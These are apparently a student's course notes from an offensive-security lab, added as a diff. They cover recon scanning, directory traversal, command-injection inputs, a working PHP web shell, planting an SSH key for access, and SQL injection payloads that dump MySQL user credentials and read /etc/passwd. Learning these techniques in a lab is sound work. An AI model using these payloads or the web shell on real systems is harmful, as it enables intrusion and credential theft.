@@ -1,0 +1,828 @@
+##### Day 1
+whoami
+id
+cat /etc/os-*
+lsb_release -a
+uname -a
+Kernel Version: 4.15.0-167-generic
+hostnamectl
+  Operating System: Ubuntu 18.04.6 LTS
+            Kernel: Linux 4.15.0-167-generic
+			
+https://www.exploit-db.com/
+https://www.exploit-db.com/exploits/46978
+##### Day 2
+https://quotes.toscrape.com/
+<head>
+	<meta charset="UTF-8">
+	<title>Quotes to Scrape</title>
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/main.css">
+</head>
+HTML Tags comes in pairs
+<head> </head>
+<title>Quotes to Scrape</title>
+<span>by <small class="author" itemprop="author">Albert Einstein</small>
+<small class="author" itemprop="author">Albert Einstein</small>
+sudo apt-get install python-lxml python-requests python3-pip -y
+##### webscraper.py ######
+import lxml.html
+import requests
+page = requests.get('http://quotes.toscrape.com')
+tree = lxml.html.fromstring(page.content)
+authors = tree.xpath('//small[@class="author"]/text()')
+print ('Authors: ',authors)
+##### webscraper.py ######
+python webscraper.py
+a = html tag <a></a>
+class = element with the value of "tag"
+#Advanced Scanning Techniques - Recon/Scanning
+1. Host Discovery - Ping Sweeping
+Google: ruby guides ping sweep
+https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/
+BASH:
+for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ;done
+64 bytes from 192.168.65.3: icmp_seq=1 ttl=64 time=3.69 ms
+64 bytes from 192.168.65.1: icmp_seq=1 ttl=64 time=2.82 ms
+64 bytes from 192.168.65.10: icmp_seq=1 ttl=128 time=2.53 ms
+64 bytes from 192.168.65.20: icmp_seq=1 ttl=64 time=0.067 ms
+64 bytes from 192.168.65.30: icmp_seq=1 ttl=64 time=0.945 ms
+Inefficient: nmap 192.168.65.0/24
+2. Host Enumeration - Port Scanning
+nmap -Pn -T4 192.168.65.10 -p-
+-Pn = Disregard host discovery (DO NOT PING), proxychains does not recognize ICMP
+-T4 = Timing Template (Slow/Quiet T0 -  Fast/Noisy T5)
+-p- = Scan for all 65535
+Nmap scan report for 192.168.65.10
+Host is up (0.00069s latency).
+Not shown: 65515 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5040/tcp  open  unknown
+5357/tcp  open  wsdapi
+5800/tcp  open  vnc-http
+5900/tcp  open  vnc
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49671/tcp open  unknown
+49677/tcp open  unknown
+3. Host Interrogation - Service Enum
+Nmap
+SERVICE = Shows you what NMAP thinks is running on this open port
+nc 192.168.65.10 22
+SSH-2.0-OpenSSH_for_Windows_8.1
+nmap -Pn -T4 192.168.65.10 -sV -p 22,3389
+-sV = Shows running service
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+NMAP NSE
+/usr/share/nmap/scripts
+https://nmap.org/book/man-nse.html
+Script Categories
+https://nmap.org/book/nse-usage.html#nse-categories
+safe
+discovery
+cat banner.nse | less
+nmap -Pn -T4 --script=banner.nse 192.168.65.10 -p 22,3389
+--script="not intrusive"
+--script="default or safe"
+--script="default and safe"
+--script="http-*"
+PORT     STATE SERVICE
+22/tcp   open  ssh
+|_banner: SSH-2.0-OpenSSH_for_Windows_8.1
+3389/tcp open  ms-wbt-server
+
+
+
+
+
+
+##### Day 2 #####
+Request Line of HTTP Request Message
+GET / HTTP/1.1
+GET = HTTP Method, Request
+/ = TLDomain
+HTTP/1.1 = HTTP Version
+
+www.google.com
+GET / HTTP/1.1
+
+www.google.com/maps
+GET /maps HTTP/1.1
+
+
+Status Line of HTTP Response Message
+HTTP/1.1 200 OK
+HTTP/1.1 = HTTP Version
+200 = Status Code
+OK = Reason-phrase
+
+Google: http status codes wiki
+https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
+
+X|XX
+X = Class/Categories
+
+1xx informational response – the request was received, continuing process
+2xx successful – the request was successfully received, understood, and accepted
+3xx redirection – further action needs to be taken in order to complete the request
+4xx client error – the request contains bad syntax or cannot be fulfilled
+5xx server error – the server failed to fulfil an apparently valid request
+
+XX = Provides the explanation/Reason-phrase
+
+4|04
+4 = Client Errors
+04 = Not Found
+
+#HTTP Methods
+GET = Requesting Information 
+-Navigating to a website
+
+POST = Submitting/Sending Information
+-Sending info to a website (usernames, credentials, e-mail, etc)
+
+Not applicable
+HEAD
+PUT
+
+#(F12) Dev Console
+-Inspector Tab
+-Console Tab
+--Document properties
+--Execute Functions
+
+Example Function:
+function test() {
+}
+
+test();
+
+-Network Tab
+
+#WGET
+wget -r -l2 -P /tmp ftp://ftpserver/
+-r = Recursive
+-l# = Specifying how many levels deep
+-P /tmp = Prefix directory
+
+#CURL
+curl -o stuff.html https://reddit.com
+-o stuff.html = Output location
+
+curl 'https://quotes.toscrape.com/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://www.google.com/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0' -H 'TE: trailers'
+
+#HTML Layers
+HTML = Frame of the webpage
+CSS = Cascading Style Sheets, Templates, Formats, Styles
+Javascript = Functions, Scripts
+
+HTML = frame of house
+CSS = Decor
+Javascript = Interactions
+
+#WebExample
+http://10.50.22.27/webexample/htmldemo.html
+
+#Javascript Example
+<script>
+function myFunction() {
+document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
+
+<script></script> = script HTML tag
+function myFunction() = Declaring function, name of function is myFunction()
+document = Referring to the HTML document
+getElementbyID("demo") = ID="demo"
+innerHTML = <tags>Referring to this space here</tags>
+
+
+<a ID="demo">Stuff here.</a>
+If function myFunction() is executed:
+<a ID="demo">Paragraph changed.</a>
+
+#JavaDemo
+http://10.50.22.27/java/Javademo.html
+
+<script>
+function changeText() {
+  x = document.getElementById("mySelect");
+  x.options[x.selectedIndex].text = "Melon";
+}
+</script>
+
+function changeText() = Declaring function, name is changeText()
+
+x = Variable
+document = Referring to the HTML document
+getElementbyId = Referring to Id element with a value of mySelect, Id="mySelect"
+
+	x.options 
+	selectIndex = Whichever is being selected and overwrite the text to "Melon"
+	
+<select id="mySelect">
+  <option>Apple</option>
+  <option>Orange</option>
+  <option>Pineapple</option>
+  <option>Banana</option>
+  
+#Refresh: Recon/Scanning
+1. Host Discovery - Ping Sweep
+for i in {1..255}; do (ping -c 1 192.168.65.$i | grep "bytes from" &); done
+
+2. Host Enumeration - Port Scanning
+nmap -Pn -T4 192.168.65.10 -p-
+nmap -Pn -T4 10.50.22.27 -p-
+
+3. Host Interrogation - Service Enumeration
+nc 192.168.65.10 22
+nmap -Pn -T4 -sV 192.168.65.140 -p 22,80,3389
+nmap -Pn -T4 --script=banner.nse -p 22,80,3389
+
+Host is up (0.0021s latency).
+Not shown: 65530 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+3389/tcp closed ms-wbt-server
+8080/tcp closed http-proxy
+9999/tcp closed abyss
+
+
+#Web Enumeration
+1. Scanning
+cd /usr/share/nmap/scripts
+ls http*
+
+http-enum.nse
+http-robots.txt.nse
+
+nmap -Pn -T4 --script=http-enum.nse 10.50.22.27 -p 80
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /robots.txt: Robots file
+|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+/robots.txt
+/java/
+/path/
+/uploads/
+
+nmap -Pn -T4 --script=http-robots.txt.nse 10.50.22.27 -p 80
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-robots.txt: 2 disallowed entries
+|_/cross /
+
+/cross/
+/
+
+10.50.22.27
+/robots.txt
+/java/
+/path/
+/uploads/
+/cross/
+/
+
+2. Robots.txt
+Standardized file on webservers that tells webcrawlers what they can and cannot index
+
+http://10.50.22.27/robots.txt
+
+/uploads
+/chat
+/cmdinjection
+/java
+/path
+/webexampe
+/cross
+
+3. Legitamite Surfing
+http://10.50.22.27/robots.txt
+http://10.50.22.27/uploads
+http://10.50.22.27/chat
+http://10.50.22.27/cmdinjection
+
+
+#Web Exploitation
+1. Directory Traversal - Information
+http://10.50.22.27/path/pathdemo.php
+
+../../../../../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+
+/etc/passwd
+/etc/group
+/etc/hosts
+/etc/networks
+/etc/resolv.conf
+
+http://10.50.22.27/path/pathdemo.php?myfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=File+look+up
+
+
+http://10.50.22.27/path/pathdemo.php
+http://10.50.22.27/path/pathdemo.php?
+http://10.50.22.27/path/pathdemo.php?myfile
+http://10.50.22.27/path/pathdemo.php?myfile=
+http://10.50.22.27/path/pathdemo.php?myfile=../../../../../../../../etc/hosts
+
+
+2. Command Injection - Information/Access
+http://10.50.22.27/cmdinjection/cmdinjectdemo.php
+
+8.8.8.8
+
+ping -c 1 "8.8.8.8"
+
+; whoami
+Result: www-data
+
+Information:
+-User
+; whoami
+; id
+
+-Files
+; cat /etc/passwd
+www-data:x:33:33:www-data:/var/www:/bin/bash
+User: www-data
+Home Directory: /var/www
+Login Shell: /bin/bash
+
+; cat /etc/group
+root:x:0:
+adm:x:4:syslog,ubuntu
+sudo:x:27:ubuntu
+admin:x:113:
+
+; cat /etc/hosts
+; cat /etc/networks
+; cat /etc/resolv.conf
+
+../../../../../../../../etc/passwd
+This webpage is not vulnerable to directory traversal.
+
+
+3. Malicious File Upload (WebShell) - Information/Access
+
+3 Considerations:
+1) Can you upload? Yes
+2) Are file extentions being sanitized? No
+3) Can you access the uploads directory? Yes
+
+########## bad.php ##########
+<HTML><BODY>
+<Form METHOD="GET" NAME="badform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="hello">
+</Form>
+<?php system($_GET['cmd']);?>
+</BODY></HTML>
+########## bad.php ##########
+
+Test the WebShell:
+whoami
+
+
+2a/3a. SSH Keys - Access
+
+#Generate Our SSH Keys from the Workstation we logging in with
+
+ssh-keygen -t rsa -b 4096
+[Enter for Default]
+[Enter for Default]
+Override? [y]
+Passphrase [Enter for Default]
+Passphrase [Enter for Default]
+
+cd /home/student/.ssh/
+id_rsa = Private Key
+id_rsa.pub = Public Key
+
+cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8aF0bgKu/AZRgCHi9wdSyySxN3rFDaqrusnwliRNM7EGhmOEpVrKW1pAO6FTiTT+uH2YrAzlPFa5nX+1DEXnr7e9n0kUY/yyWelCzjsZbCYFDkPwNraFZxso0LblhlB0/yu6q5XA5HHqDeX4SsEJpoYP9ycXW6dUA14XdN6miUuAMe1hPj48aS/JwiZ81RMRqfVZZlb6PXRqK2InkOUCPRN0N0lZ55UiZsye/IkcnKHmaX5aHwJzRr4qNbcJ2aO2KmzOdnvjl6VyIYsENyJg4RNKEZwaYtBLB44cwLH+C3KcF4DYHHUVXw2UbB9jEMJ1p9ap2XYv75o5n8cL2RBEzH0C/sKAO5CDGge5PRqYuko1L6ydcfnEc5q6SDEsSxzKoftXmsK6MP1+E0cZpMxzhE2snG/cn7ONAz2iwVfbPqxYbS3jG/1tuzZEeEanV+muOOgGwGXifi4HYQND5IMtYsa6jxNpwskVuNzvPWkQ/w+IXcyrRyWaeHmzdmbEnrPjsbwr5bFW4qlXdwsO9DE9MkThsLpuTaN9xIfykMeVwF1Ad79Z2KVFZLOq0ByvUdb5vAGR1KD2j6+dyPqTlMlbUYRodJMA/eMab39IMyVTCy56g+4mNT934v3dLQ/L5SphIHViPScdEANWG7T0j5hPNwM3vGICZZAeuLx99Et3unw== student@lin-ops
+
+#Uploading the public key onto the webserver
+http://10.50.22.27/uploads/bad_nguyen.php
+
+1. Determine the user running on the webserver
+whoami
+
+Result: www-data
+
+2. Determine the user's home directory
+cat /etc/passwd | grep www-data
+
+Result: www-data:x:33:33:www-data:/var/www:/bin/bash
+
+User: www-data
+Home Directory: /var/www
+Login Shell: /bin/bash
+
+3. Determine if the .ssh/ directory exists in the user's home directory, if not we need to create it
+
+ls -la /var/www
+-l = Long listing
+-a = Shows hidden directories
+
+Result:
+drwxrwxr-x  5 root     www-data 4096 Jun 29 17:25 .
+drwxr-xr-x 14 root     root     4096 Jun 23 15:42 ..
+-rw-------  1 www-data www-data    5 Jun 29 17:25 .bash_history
+drwxr-xr-x  2 www-data www-data 4096 Jun 29 17:20 .ssh
+drwxr-xr-x  9 root     root     4096 Jun 23 15:45 html
+drwxr-xr-x  2 www-data www-data 4096 Jun 29 17:19 ssh
+
+===> .ssh/ <===
+
+What if there was no .ssh/ directory listed?
+Create it: mkdir /var/www/.ssh
+Verify it: ls -la /var/www
+
+4. Upload our public key to the authorized_keys file
+echo "" >> /var/www/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8aF0bgKu/AZRgCHi9wdSyySxN3rFDaqrusnwliRNM7EGhmOEpVrKW1pAO6FTiTT+uH2YrAzlPFa5nX+1DEXnr7e9n0kUY/yyWelCzjsZbCYFDkPwNraFZxso0LblhlB0/yu6q5XA5HHqDeX4SsEJpoYP9ycXW6dUA14XdN6miUuAMe1hPj48aS/JwiZ81RMRqfVZZlb6PXRqK2InkOUCPRN0N0lZ55UiZsye/IkcnKHmaX5aHwJzRr4qNbcJ2aO2KmzOdnvjl6VyIYsENyJg4RNKEZwaYtBLB44cwLH+C3KcF4DYHHUVXw2UbB9jEMJ1p9ap2XYv75o5n8cL2RBEzH0C/sKAO5CDGge5PRqYuko1L6ydcfnEc5q6SDEsSxzKoftXmsK6MP1+E0cZpMxzhE2snG/cn7ONAz2iwVfbPqxYbS3jG/1tuzZEeEanV+muOOgGwGXifi4HYQND5IMtYsa6jxNpwskVuNzvPWkQ/w+IXcyrRyWaeHmzdmbEnrPjsbwr5bFW4qlXdwsO9DE9MkThsLpuTaN9xIfykMeVwF1Ad79Z2KVFZLOq0ByvUdb5vAGR1KD2j6+dyPqTlMlbUYRodJMA/eMab39IMyVTCy56g+4mNT934v3dLQ/L5SphIHViPScdEANWG7T0j5hPNwM3vGICZZAeuLx99Et3unw== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+5. Validate the key was uploaded into the authorized_keys file
+cat /var/www/.ssh/authorized_keys
+
+#Logging into the Webserver/Target
+On the workstation you generated the key from
+
+ssh www-data@10.50.22.27
+
+
+
+
+
+
+
+
+
+
+##### Day 3 #####
+Mission
+Recon/Scanning
+Initial Access
+-Web Enum
+-Web Exploitation
+Database
+Username: [ !;#'    ]
+Password: [     ]
+SQL - Basic commands that universial
+Multiple Versions - SQLlite,MySQL,MariaDB,MicrosoftSQL,etc
+Vendors - Specific commands
+Relational Databases
+Commands
+SELECT
+UNION
+WHERE
+SQL Commands
+mysql --user=root --pass=password
+show databases;
+Default Databases
+information_schema = Database that holds information about all databases, all tables, and all columns
+mysql = Databases that holds user account information, logs, configurations
+performance_schema = Database that holds server status information
+Custom Database
+session = Someone created it
+show tables from session;
+select * from session.Tires;
+#Practice:
+show databases;
+show tables from session;
+select * from session.car;
+select carid,name,type from session.car;
+select carid,type,name from session.car;
+describe session.car;
+#Nesting Statements
+select * from session.car; select * from session.Tires;
+select * from session.Tires; select * from session.car;
+#Combining Statements
+select * from session.Tires UNION select * from session.car; #Get an error
+Tires table: 4 columns
+car table: 6 columns
+Subtraction Route:
+Tires table: 4 columns
+car table: 4 columns
+select * from session.Tires UNION select carid,name,type,cost from session.car;
+Addition Route:
+Tires table: 6 columns
+car table: 6 columns
+select *,1,2 from session.Tires UNION select * from session.car;
+#WHERE
+select * from session.Tires WHERE size = '16';
+#Server Side Query
+Public Facing Webpage:
+Username: JohnDoe243
+Password: paas1234
+$name = JohnDoe243
+$pass = paas1234
+Configured on the Webpage:
+SELECT id FROM users WHERE name='$name' AND pass='$pass'
+CODE to connect to the SQL database that has your registered credentials
+CODE
+CODE
+SELECT id FROM users WHERE name=''JohnDoe243'' AND pass='paas1234';
+1) Determining if a webpage is vulnerable via Truth Statements
+Public Facing Webpage:
+Username: JohnDoe243
+Password: paas1234
+$name = JohnDoe243
+$pass = paas1234
+SELECT id FROM users WHERE name='$name' AND pass='$pass'
+SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234';
+Public Facing Webpage:
+Username: JohnDoe243' or 1='1
+Password: paas1234' or 1='1
+$name = JohnDoe243
+$pass = paas1234
+SELECT id FROM users WHERE name='$name' AND pass='$pass'
+SELECT id FROM users WHERE name='JohnDoe243' or 1='1' AND pass='paas1234' or 1='1';
+Without single ticks to close off pairs, it will error out:
+SELECT id FROM users WHERE name=' ' AND pass=' ';
+SELECT id FROM users WHERE name='$name' AND pass='$pass'
+SELECT id FROM users WHERE name='daniel' of 1=1' AND pass='$pass'
+SQL Injection - Login Pages
+#Post Method
+0. Interact with the Webpage (Open Network Tab)
+1. Determine if Login Page is vulnerable via Truth Statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+dan' or 1='1
+dan' or 1='1;
+dan' or 1='1; #
+2. Using the Network Tab, determine the query string parameters
+F12 > Network Tab > Click on first page > Request Tab
+Query String Parameters:
+username
+passwd
+#GET Method
+1. Copy the URL that has the PHP
+http://10.50.39.57/login.php
+http://10.50.39.57/login.php?
+? = Query String Parameters to follow
+http://10.50.39.57/login.php?username
+http://10.50.39.57/login.php?username=
+http://10.50.39.57/login.php?username=dan' or 1='1
+http://10.50.39.57/login.php?username=dan' or 1='1&
+http://10.50.39.57/login.php?username=dan' or 1='1&passwd
+http://10.50.39.57/login.php?username=dan' or 1='1&passwd=
+http://10.50.39.57/login.php?username=dan' or 1='1&passwd=dan' or 1='1
+    [0] => Luke_Skywalker
+    [name] => Luke_Skywalker
+    [1] => Jedi
+    [pass] => Jedi
+)
+1Array
+(
+    [0] => Darth_Vader
+    [name] => Darth_Vader
+    [1] => Sith
+    [pass] => Sith
+)
+1Array
+(
+    [0] => c3p0
+    [name] => c3p0
+    [1] => annoying
+    [pass] => annoying
+)
+1Array
+(
+    [0] => Batman
+    [name] => Batman
+    [1] => BWyane
+    [pass] => BWyane
+	
+SQL Injection - Webpages
+#POST Method
+0. Interact with the webpage to determine behavior
+1. Determine if webpage is vulnerable via Truth Statement
+Truth Statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+# = Will Comment Out everything after it
+Ford' or 1='1 		<= Nope
+Ford' or 1='1; 		<= Nope
+Ford' or 1='1; # 	<= Nope
+Dodge' or 1='1 		<= Nope
+Dodge' or 1='1; 	<= Nope
+Dodge' or 1='1; # 	<= Nope
+Honda' or 1='1 		<= Nope
+Honda' or 1='1; 	<= Nope
+Honda' or 1='1; # 	<= Nope
+Audi' or 1='1 		<= Works
+Audi' or 1='1; 		<= Works
+Audi' or 1='1; # 	<= Works
+2. Determine the number of columns and rows that exist on the table that the webpage is displaying
+Column: 4 <=== Start with the lowest number
+Rows: 5
+3. Fuzz for the columns that exist on the table that the webpage is displaying
+Audi' or 1='1 		<= Works
+Audi' or 1='1; 		<= Works
+Audi' or 1='1; # 	<= Works
+Audi' UNION select 1,2,3,4		<= Nope
+Audi' UNION select 1,2,3,4;		<= Nope
+Audi' UNION select 1,2,3,4; #	<= Nope
+Audi' UNION select 1,2,3,4,5	<= Nope
+Audi' UNION select 1,2,3,4,5;	<= Nope
+Audi' UNION select 1,2,3,4,5; #	<= Works
+4. Determine the number of columns that exist, the order, and what is hidden
+Columns: 5
+Order: 1,3,4,5
+-Could also mean 1,2,3,4,5 or 1,3,4,5,2 or 2,1,3,4,5
+Hidden: 2
+Cars Table
+carid | name | type | cost | color | year
+Demo Table
+1		| 2		 | 3	   | 4		 | 5
+Display	| Hidden | Display | Display | Display
+5. Extract database information using the Golden Statement
+Generic SQL Statement
+UNION SELECT <columns> FROM <database>.<table>
+Golden Statement
+UNION select table_schema,table_name,column_name from information_schema.columns
+information_schema = Database, holds all database information
+columns = Table, inside of the information_schema database
+table_schema = Column, lists out database names
+table_name = Column, lists out table names
+column_name = Column, lists out column names
+Audi' UNION select 1,2,3,4,5; #	<= Works
+Audi' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
+1			| 2		 	 | 3	    | 4		  | 5
+Display		| Hidden 	 | Display 	| Display | Display
+table_schema| table_name | column_name | 1    | 2
+Audi' UNION select 1,2,3,4,5; #	<= Works
+Audi' UNION select table_schema,1,table_name,column_name,2 from information_schema.columns; #
+1			| 2		  | 3	      | 4		  | 5
+Display		| Hidden  | Display   | Display   | Display
+table_schema| 1		  |table_name | column_name | 2
+On the Webpage, Column are displaying:
+1st Column: List of Database Names
+2nd Column: List of Table Names
+3rd Column: List of Column Names
+4th Column: List of 2
+6. Extract desired information
+Database: session
+Table: car
+Columns: name,color,year
+Audi' UNION select
+table_schema,1,table_name,column_name,2  = 5
+from
+information_schema.columns; # = <database>.<table>
+Audi' UNION select name,color,year,1,2 from session.car; #
+Audi' UNION select name,1,color,year,2 from session.car; #
+#GET Method
+0. Interact with the webpage to determine behavior
+http://10.50.39.57/uniondemo.php?Selection=1&Submit=Submit
+http://10.50.39.57/uniondemo.php?Selection=2&Submit=Submit
+http://10.50.39.57/uniondemo.php?Selection=3&Submit=Submit
+http://10.50.39.57/uniondemo.php?Selection=4&Submit=Submit
+1. Determine if webpage is vulnerable via Truth Statement
+Truth Statement (' = for Post Method)
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+Truth Statement (For Get Method)
+<value> or 1=1
+<value> or 1=1;
+<value> or 1=1; #
+Nope
+http://10.50.39.57/uniondemo.php?Selection=1 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=1 or 1=1;
+http://10.50.39.57/uniondemo.php?Selection=1 or 1=1; #
+Works
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1;
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1; #
+Works
+http://10.50.39.57/uniondemo.php?Selection=3 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=3 or 1=1;
+http://10.50.39.57/uniondemo.php?Selection=3 or 1=1; #
+Works
+http://10.50.39.57/uniondemo.php?Selection=4 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=4 or 1=1;
+http://10.50.39.57/uniondemo.php?Selection=4 or 1=1; #
+2. Determine the number of columns and rows that exist on the table that the webpage is displaying
+Column: 3 <=== Start with the lowest number
+Rows: 5
+3. Fuzz for the columns that exist on the table that the webpage is displaying
+Generic Fuzzing
+UNION select 1,2,3
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,3
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1;
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,3;
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1; #
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,3; #
+4. Determine the number of columns that exist, the order, and what is hidden
+Columns: 3
+Order: 1,3,2
+Hidden: N/A
+Backend Table
+1	| 2		| 3
+Webpage
+1	| 3		| 2
+5. Extract database information using the Golden Statement
+Generic SQL Statement
+UNION SELECT <columns> FROM <database>.<table>
+Golden Statement
+UNION select table_schema,table_name,column_name from information_schema.columns
+information_schema = Database, holds all database information
+columns = Table, inside of the information_schema database
+table_schema = Column, lists out database names
+table_name = Column, lists out table names
+column_name = Column, lists out column names
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,3
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns
+On the Webpage, Column are displaying:
+1st Column: List of Database names
+2nd Column: List of Column names
+3rd Column: List of Tables names
+SQL Statement
+1		| 2			| 3
+database| table		|column
+Webpage
+1		| 3			| 2
+database| column	| table
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
+SQL Statement
+1		| 2			| 3
+database| column	|table
+Webpage
+1		| 3			| 2
+database| table		| column
+6. Extract desired information
+Generic SQL Statement
+UNION SELECT <columns> FROM <database>.<table>
+Database: mysql
+Table: user
+Column: Host,User,Password
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
+http://10.50.39.57/uniondemo.php?Selection=2 UNION SELECT host,user,password FROm mysql.user
+### Filtering with the WHERE command
+Default Databases
+information_schema
+performance_schema
+mysql
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema = 'session'
+### Finding SQL Version
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,@@version
+10.1.48-MariaDB-0ubuntu0.18.04.1
+### MYSQL LOAD_FILE() Function
+http://10.50.39.57/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd')
+
